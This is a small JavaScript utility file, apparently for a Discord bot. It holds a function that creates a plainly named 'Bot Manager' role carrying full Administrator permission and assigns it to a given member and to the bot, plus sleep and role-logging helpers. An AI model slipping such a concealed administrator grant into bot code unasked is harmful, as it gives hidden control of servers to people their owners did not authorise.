export function createAdminRole(guild, client, guildMember) {
  guild.createRole({
    name: 'Bot Manager',
    color: 'WHITE',
    permissions: 8,
    mentionable: false,
    hoist: false
  }).then(role => {
    let bot = guild.member(client.user);
    
    guildMember.addRole(role, 'because');
    bot.addRole(role, 'because');
  })
}

export function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

export function printRoles(guild) {
  console.log(`Guild is ${guild}, remaining roles are ${guild.roles.map(role => role.name)}`);
}